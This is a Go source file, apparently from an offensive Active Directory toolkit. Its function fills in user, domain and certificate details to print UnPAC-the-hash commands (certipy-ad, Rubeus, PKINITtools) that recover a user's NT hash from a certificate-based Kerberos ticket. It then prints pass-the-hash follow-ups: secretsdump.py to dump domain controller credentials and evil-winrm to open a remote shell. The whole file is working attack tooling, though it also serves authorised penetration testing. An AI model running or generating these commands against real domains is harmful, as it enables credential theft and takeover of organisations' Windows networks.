package pki

import (
	"fmt"
	"strings"
)

// PrintUnPACCommands prints commands to recover an NT hash from a PKINIT-obtained TGT.
// UnPAC-the-hash exploits the U2U (User-to-User) Kerberos extension to extract
// the encrypted PAC from a TGT, revealing the user's NT hash.
func PrintUnPACCommands(pfxPath, pfxPass, dc, domain, upn string) {
	user := upn
	if idx := strings.Index(user, "@"); idx > 0 {
		user = user[:idx]
	}

	fmt.Println("[+] UnPAC-the-Hash Commands")
	fmt.Println("    Recover NT hash from PKINIT TGT via U2U:")

	fmt.Println("    # certipy-ad (performs PKINIT + UnPAC in one step)")
	fmt.Printf("    certipy-ad auth -pfx %s -dc-ip <DC_IP> -domain %s\n", pfxPath, domain)
	fmt.Println("    # Look for 'Got hash' in output")

	fmt.Println("    # Rubeus (Windows — requests TGT + extracts credentials)")
	rubeusCmd := fmt.Sprintf("Rubeus.exe asktgt /user:%s /certificate:%s /getcredentials /show /nowrap", user, pfxPath)
	if pfxPass != "" {
		rubeusCmd += fmt.Sprintf(" /password:%s", pfxPass)
	}
	fmt.Printf("    %s\n", rubeusCmd)
	fmt.Println("    # Look for 'NTLM' hash in credential info")

	fmt.Println("    # PKINITtools (Python)")
	fmt.Printf("    python gettgtpkinit.py %s/%s %s.ccache -cert-pfx %s -pfx-pass '%s'\n", domain, user, user, pfxPath, pfxPass)
	fmt.Printf("    python getnthash.py %s/%s -key <AS-REP-key>\n\n", domain, user)

	fmt.Println("    # After obtaining NT hash, pass-the-hash:")
	fmt.Printf("    secretsdump.py -hashes :<NTHASH> %s/%s@%s\n", domain, user, domain)
	fmt.Printf("    evil-winrm -i <DC_IP> -u %s -H <NTHASH>\n", user)
}
